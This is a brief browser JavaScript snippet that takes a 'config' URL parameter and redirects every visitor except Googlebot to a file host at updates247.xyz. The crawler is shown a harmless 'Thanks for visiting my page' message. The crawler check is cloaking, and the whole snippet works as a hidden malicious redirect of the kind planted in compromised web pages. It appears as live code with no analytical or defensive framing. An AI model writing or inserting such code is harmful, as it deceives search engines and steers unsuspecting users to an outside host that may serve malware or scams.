const config = new URLSearchParams(window.location.search).get('config');
const slug = config ? config.match(/([^\/]+)$/)?.[1] : null;

console.log("CONFIG:", config);
console.log("SLUG:", slug);

if (slug && !navigator.userAgent.includes('Googlebot')) {
    window.location.href = "https://files.updates247.xyz/" + encodeURIComponent(slug);
} else {
    console.log("Thanks for visiting my page");
}